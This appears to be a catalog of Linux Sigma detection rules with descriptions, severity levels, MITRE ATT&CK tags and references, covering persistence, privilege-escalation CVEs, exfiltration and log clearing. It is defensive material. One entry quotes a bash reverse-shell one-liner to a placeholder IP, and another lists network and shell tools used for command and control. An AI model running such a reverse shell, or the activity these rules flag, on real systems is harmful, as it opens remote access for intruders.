* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md

    
### Steganography Hide Zip Information in Picture File
    
    Detects appending of zip file to image

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_hidden_zip_files_steganography.yml
* https://attack.mitre.org/techniques/T1027/003/

* https://zerotoroot.me/steganography-hiding-a-zip-in-a-jpeg-file/

    
### Possible Coin Miner CPU Priority Param
    
    Detects command line parameter very often used with coin miners

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_coinminer.yml
* https://xmrig.com/docs/miner/command-line-options

    
### System Information Discovery
    
    Detects System Information Discovery commands

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1082
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_system_info_discovery.yml
* https://attack.mitre.org/techniques/T1082/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md

    
### Steganography Hide Files with Steghide
    
    Detects embeding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_steghide_embed_steganography.yml
* https://attack.mitre.org/techniques/T1027/003/

* https://vitux.com/how-to-hide-confidential-files-in-images-on-debian-using-steganography/

    
### Creation Of An User Account
    
    Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.

    * Level: medium
    * MITRE: attack.t1136.001
    * MITRE: attack.persistence
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_create_account.yml
* MITRE Attack technique T1136; Create Account 

    
### Edit of .bash_profile and .bashrc
    
    Detects change of user environment. Adversaries can insert code into these files to gain persistence each time a user logs in or opens a new shell.

    * Level: medium
    * MITRE: attack.s0003
    * MITRE: attack.persistence
    * MITRE: attack.t1546.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_alter_bash_profile.yml
* MITRE Attack technique T1156; .bash_profile and .bashrc. 

    
### Data Exfiltration with Wget
    
    Detects attempts to post the file with the usage of wget utility. The adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow.

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_data_exfil_wget.yml
* https://attack.mitre.org/tactics/TA0010/

* https://linux.die.net/man/1/wget

* https://gtfobins.github.io/gtfobins/wget/

    
### Loading of Kernel Module via Insmod
    
    Detects loading of kernel modules with insmod command. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. Adversaries may use LKMs to obtain persistence within the system or elevate the privileges.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1547.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_load_module_insmod.yml
* https://attack.mitre.org/techniques/T1547/006/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.006/T1547.006.md

* https://linux.die.net/man/8/insmod

* https://man7.org/linux/man-pages/man8/kmod.8.html

    
### Clipboard Collection with Xclip Tool
    
    Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed. Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.

    * Level: low
    * MITRE: attack.collection
    * MITRE: attack.t1115
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_clipboard_collection.yml
* https://attack.mitre.org/techniques/T1115/

* https://linux.die.net/man/1/xclip

* https://www.cyberciti.biz/faq/xclip-linux-insert-files-command-output-intoclipboard/

    
### System Information Discovery
    
    Detects system information discovery commands

    * Level: informational
    * MITRE: attack.discovery
    * MITRE: attack.t1082
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_system_info_discovery2.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md

    
### Overwriting the File with Dev Zero or Null
    
    Detects overwriting (effectively wiping/deleting) of a file.

    * Level: low
    * MITRE: attack.impact
    * MITRE: attack.t1485
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_dd_delete_file.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md

    
### Password Policy Discovery
    
    Detects password policy discovery commands

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1201
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_password_policy_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.md

* https://attack.mitre.org/techniques/T1201/

* https://linux.die.net/man/1/chage

* https://man7.org/linux/man-pages/man1/passwd.1.html

* https://superuser.com/questions/150675/how-to-display-password-policy-information-for-a-user-ubuntu

    
### CVE-2021-3156 Exploitation Attempt
    
    Detects exploitation attempt of vulnerability described in CVE-2021-3156. | Alternative approach might be to look for flooding of auditd logs due to bruteforcing | required to trigger the heap-based buffer overflow.

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    * MITRE: cve.2021.3156
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_cve_2021_3156_sudo_buffer_overflow.yml
* https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit

    
### Linux Network Service Scanning
    
    Detects enumeration of local or remote network services.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1046
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_network_service_scanning.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md

    
### Network Sniffing
    
    Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

    * Level: low
    * MITRE: attack.credential_access
    * MITRE: attack.discovery
    * MITRE: attack.t1040
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_network_sniffing.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1040/T1040.md

    
### Split A File Into Pieces
    
    Detection use of the command "split" to split files into parts and possible transfer.

    * Level: low
    * MITRE: attack.exfiltration
    * MITRE: attack.t1030
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_split_file_into_pieces.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1030/T1030.md

    
### CVE-2021-3156 Exploitation Attempt
    
    Detects exploitation attempt of vulnerability described in CVE-2021-3156. | Alternative approach might be to look for flooding of auditd logs due to bruteforcing | required to trigger the heap-based buffer overflow.

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    * MITRE: cve.2021.3156
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_cve_2021_3156_sudo_buffer_overflow_brutforce.yml
* https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit

    
### System Owner or User Discovery
    
    Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1033
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_user_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md

    
### Auditing Configuration Changes on Linux Host
    
    Detect changes in auditd configuration files

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_auditing_config_change.yml
* https://github.com/Neo23x0/auditd/blob/master/audit.rules

* self experience

    
### Hidden Files and Directoriese
    
    Detects adversary creating hidden file or directory, by detecting directories or files with . as the first character

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_hidden_files_directories.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.001/T1564.001.md

* https://attack.mitre.org/techniques/T1564/001/

    
### Systemd Service Reload or Start
    
    Detects a reload or a start of a service.

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.t1543.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_pers_systemd_reload.yml
* https://attack.mitre.org/techniques/T1543/002/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.002/T1543.002.md

    
### System Shutdown/Reboot
    
    Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems.

    * Level: informational
    * MITRE: attack.impact
    * MITRE: attack.t1529
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_system_shutdown_reboot.yml
* hhttps://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md

    
### Clipboard Collection of Image Data with Xclip Tool
    
    Detects attempts to collect image data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed. Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.

    * Level: low
    * MITRE: attack.collection
    * MITRE: attack.t1115
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_clipboard_image_collection.yml
* https://attack.mitre.org/techniques/T1115/

* https://linux.die.net/man/1/xclip

    
### Binary Padding
    
    Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This rule detect using dd and truncate to add a junk data to file.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_binary_padding.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.001/T1027.001.md

    
### Remove Immutable File Attribute
    
    Detects removing immutable file attribute.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1222.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_chattr_immutable_removal.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.002/T1222.002.md

    
### File Time Attribute Change
    
    Detect file time attribute change to hide new or changes to existing files.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_change_file_time_attr.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md

    
### Steganography Extract Files with Steghide
    
    Detects extraction of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_steghide_extract_steganography.yml
* https://attack.mitre.org/techniques/T1027/003/

* https://vitux.com/how-to-hide-confidential-files-in-images-on-debian-using-steganography/

    
### Suspicious Commands Linux
    
    Detects relevant commands often related to malware or hacking activity

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_susp_cmds.yml
* Internal Research - mostly derived from exploit code including code in MSF

    
### Audio Capture
    
    Detects attempts to record audio with arecord utility

    * Level: low
    * MITRE: attack.collection
    * MITRE: attack.t1123
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_audio_capture.yml
* https://linux.die.net/man/1/arecord

* https://linuxconfig.org/how-to-test-microphone-with-audio-linux-sound-architecture-alsa

* https://attack.mitre.org/techniques/T1123/

    
### File or Folder Permissions Change
    
    Detects file and folder permission changes.

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1222.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_file_or_folder_permissions.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.002/T1222.002.md

    
### Disable System Firewall
    
    Detects disabling of system firewalls which could be used by adversaries to bypass controls that limit usage of the network.

    * Level: high
    * MITRE: attack.t1562.004
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_disable_system_firewall.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md

* https://attack.mitre.org/techniques/T1562/004/

* https://firewalld.org/documentation/man-pages/firewall-cmd.html

    
### Program Executions in Suspicious Folders
    
    Detects program executions in suspicious non-program folders related to malware or hacking activity

    * Level: medium
    * MITRE: attack.t1587
    * MITRE: attack.t1584
    * MITRE: attack.resource_development
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_susp_exe_folders.yml
* Internal Research

    
### Linux Capabilities Discovery
    
    Detects attempts to discover the files with setuid/setgid capabilitiy on them. That would allow adversary to escalate their privileges.

    * Level: low
    * MITRE: attack.collection
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1123
    * MITRE: attack.t1548
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_capabilities_discovery.yml
* https://man7.org/linux/man-pages/man8/getcap.8.html

* https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

* https://mn3m.info/posts/suid-vs-capabilities/

* https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099

    
### CVE-2021-4034 Exploitation Attempt
    
    Detects exploitation attempt of vulnerability described in CVE-2021-4034.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_cve_2021_4034.yml
* https://github.com/berdav/CVE-2021-4034

* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034

* https://access.redhat.com/security/cve/CVE-2021-4034

    
### Steganography Unzip Hidden Information From Picture File
    
    Detects extracting of zip file from image file

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_unzip_hidden_zip_files_steganography.yml
* https://attack.mitre.org/techniques/T1027/003/

* https://zerotoroot.me/steganography-hiding-a-zip-in-a-jpeg-file/

    
### Webshell Remote Command Execution
    
    Detects possible command execution by web application/web shell

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_web_rce.yml
* personal experience

    
### Suspicious C2 Activities
    
    Detects suspicious activities as declared by Florian Roth in its 'Best Practice Auditd Configuration'. This includes the detection of the following commands; wget, curl, base64, nc, netcat, ncat, ssh, socat, wireshark, rawshark, rdesktop, nmap. These commands match a few techniques from the tactics "Command and Control", including not exhaustively the following; Application Layer Protocol (T1071), Non-Application Layer Protocol (T1095), Data Encoding (T1132)

    * Level: medium
    * MITRE: attack.command_and_control
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_susp_c2_commands.yml
* https://github.com/Neo23x0/auditd

    
### Modification of ld.so.preload
    
    Identifies modification of ld.so.preload for shared object injection. This technique is used by attackers to load arbitrary code into processes.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_ld_so_preload_mod.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.006/T1574.006.md

* https://eqllib.readthedocs.io/en/latest/analytics/fd9b987a-1101-4ed3-bda6-a70300eaf57e.html

    
### Screen Capture with Import Tool
    
    Detects adversary creating screen capture of a desktop with Import Tool. Highly recommended using rule on servers, due to high usage of screenshot utilities on user workstations. ImageMagick must be installed.

    * Level: low
    * MITRE: attack.collection
    * MITRE: attack.t1113
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_screencapture_import.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md

* https://attack.mitre.org/techniques/T1113/

* https://linux.die.net/man/1/import

* https://imagemagick.org/

    
### OMIGOD SCX RunAsProvider ExecuteShellCommand
    
    Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.initial_access
    * MITRE: attack.execution
    * MITRE: attack.t1068
    * MITRE: attack.t1190
    * MITRE: attack.t1203
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_omigod_scx_runasprovider_executeshellcommand.yml
* https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure

* https://github.com/Azure/Azure-Sentinel/pull/3059

    
### Data Compressed
    
    An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.

    * Level: low
    * MITRE: attack.exfiltration
    * MITRE: attack.t1560.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_data_compressed.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md

    
### Suspicious History File Operations
    
    Detects commandline operations on shell history files

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_susp_histfile_operations.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.003/T1552.003.md

    
### Credentials In Files
    
    Detecting attempts to extract passwords with grep

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_find_cred_in_files.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md

    
### Screen Capture with Xwd
    
    Detects adversary creating screen capture of a full with xwd. Highly recommended using rule on servers, due high usage of screenshot utilities on user workstations

    * Level: low
    * MITRE: attack.collection
    * MITRE: attack.t1113
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_screencaputre_xwd.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md

* https://attack.mitre.org/techniques/T1113/

* https://linux.die.net/man/1/xwd

    
### Systemd Service Creation
    
    Detects a creation of systemd services which could be used by adversaries to execute malicious code.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1543.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_systemd_service_creation.yml
* https://attack.mitre.org/techniques/T1543/002/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.002/T1543.002.md

    
### Clear Command History
    
    Clear command history in linux which is used for defense evasion.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.003/T1070.003.md

* https://attack.mitre.org/techniques/T1070/003/

* https://www.hackers-arise.com/single-post/2016/06/20/Covering-your-BASH-Shell-Tracks-AntiForensics

    
### Suspicious Log Entries
    
    Detects suspicious log entries in Linux log files

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_shell_susp_log_entries.yml
    
### Space After Filename
    
    Detects space after filename

    * Level: low
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_space_after_filename_.yml
* https://attack.mitre.org/techniques/T1064

    
### Symlink Etc Passwd
    
    Detects suspicious command lines that look as if they would create symbolic links to /etc/passwd

    * Level: high
    * MITRE: attack.t1204.001
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_symlink_etc_passwd.yml
* https://www.qualys.com/2021/05/04/21nails/21nails.txt

    
### Sudo Privilege Escalation CVE-2019-14287
    
    Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    * MITRE: attack.t1548.003
    * MITRE: cve.2019.14287
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_sudo_cve_2019_14287.yml
* https://www.openwall.com/lists/oss-security/2019/10/14/1

* https://access.redhat.com/security/cve/cve-2019-14287

* https://twitter.com/matthieugarin/status/1183970598210412546

    
### Equation Group Indicators
    
    Detects suspicious shell commands used in various Equation Group scripts and tools

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.g0020
    * MITRE: attack.t1059.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml
* https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1

    
### Shellshock Expression
    
    Detects shellshock expressions in log files

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_shellshock.yml
* https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf

    
### Remote File Copy
    
    Detects the use of tools that copy files from or to remote systems

    * Level: low
    * MITRE: attack.command_and_control
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_file_copy.yml
* https://attack.mitre.org/techniques/T1105/

    
### Code Injection by ld.so Preload
    
    Detects the ld.so preload persistence file. See `man ld.so` for more information.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1574.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_ldso_preload_injection.yml
* https://man7.org/linux/man-pages/man8/ld.so.8.html

    
### JexBoss Command Sequence
    
    Detects suspicious command sequence that JexBoss

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_susp_jexboss.yml
* https://www.us-cert.gov/ncas/analysis-reports/AR18-312A

    
### Nimbuspwn Exploitation
    
    Detects exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800)

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_nimbuspwn_privilege_escalation_exploit.yml
* https://www.microsoft.com/security/blog/2022/04/26/microsoft-finds-new-elevation-of-privilege-linux-vulnerability-nimbuspwn/

* https://github.com/Immersive-Labs-Sec/nimbuspwn

    
### Sudo Privilege Escalation CVE-2019-14287
    
    Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    * MITRE: attack.t1548.003
    * MITRE: cve.2019.14287
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_sudo_cve_2019_14287_user.yml
* https://www.openwall.com/lists/oss-security/2019/10/14/1

* https://access.redhat.com/security/cve/cve-2019-14287

* https://twitter.com/matthieugarin/status/1183970598210412546

    
### Buffer Overflow Attempts
    
    Detects buffer overflow attempts in Unix system log files

    * Level: high
    * MITRE: attack.t1068
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_buffer_overflows.yml
* https://github.com/ossec/ossec-hids/blob/master/etc/rules/attack_rules.xml

    
### Setuid and Setgid
    
    Detects suspicious change of file privileges with chown and chmod commands

    * Level: low
    * MITRE: attack.persistence
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_setgid_setuid.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1166/T1166.md

* https://attack.mitre.org/techniques/T1166/

    
### Modifying Crontab
    
    Detects suspicious modification of crontab file.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1053.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_crontab_file_modification.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md

    
### Connection Proxy
    
    Detects setting proxy

    * Level: low
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_proxy_connection.yml
* https://attack.mitre.org/techniques/T1090/

    
### Suspicious Use of /dev/tcp
    
    Detects suspicious command with /dev/tcp

    * Level: medium
    * MITRE: attack.reconnaissance
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_susp_dev_tcp.yml
* https://www.andreafortuna.org/2021/03/06/some-useful-tips-about-dev-tcp/

* https://book.hacktricks.xyz/shells/shells/linux

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md#atomic-test-1---port-scan

    
### Suspicious Activity in Shell Commands
    
    Detects suspicious shell commands used in various exploit codes (see references)

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_shell_susp_commands.yml
* http://www.threatgeek.com/2017/03/widespread-exploitation-attempts-using-cve-2017-5638.html

* https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts_code_exec_exception_delegator.rb#L121

* http://pastebin.com/FtygZ1cg

* https://artkond.com/2017/03/23/pivoting-guide/

    
### Privilege Escalation Preparation
    
    Detects suspicious shell commands indicating the information gathering phase as preparation for the Privilege Escalation.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_shell_priv_esc_prep.yml
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

* https://patrick-bareiss.com/detect-privilege-escalation-preparation-in-linux-with-sigma/

    
### PwnKit Local Privilege Escalation
    
    Detects potential PwnKit exploitation CVE-2021-4034 in auth logs

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_pwnkit_local_privilege_escalation.yml
* https://twitter.com/wdormann/status/1486161836961579020

    
### Commands to Clear or Remove the Syslog
    
    Detects specific commands commonly used to remove or empty the syslog

    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1565.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_clear_syslog.yml
* https://www.virustotal.com/gui/file/fc614fb4bda24ae8ca2c44e812d12c0fab6dd7a097472a35dd12ded053ab8474

    
### Suspicious Reverse Shell Command Line
    
    Detects suspicious shell commands or program code that may be executed or used in command line to establish a reverse shell

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
* https://alamot.github.io/reverse_shells/

    
### Linux Crypto Mining Pool Connections
    
    Detects process connections to a Monero crypto mining pool

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml
* https://www.poolwatch.io/coin/monero

    
### Linux Reverse Shell Indicator
    
    Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

    * Level: critical
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

    
### Guacamole Two Users Sharing Session Anomaly
    
    Detects suspicious session with two users present

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1212
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/other/lnx_susp_guacamole.yml
* https://research.checkpoint.com/2020/apache-guacamole-rce/

    
### Suspicious OpenSSH Daemon Error
    
    Detects suspicious SSH / SSHD error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/other/lnx_susp_ssh.yml
* https://github.com/openssh/openssh-portable/blob/master/ssherr.c

* https://github.com/ossec/ossec-hids/blob/master/etc/rules/sshd_rules.xml

    
### Disabling Security Tools
    
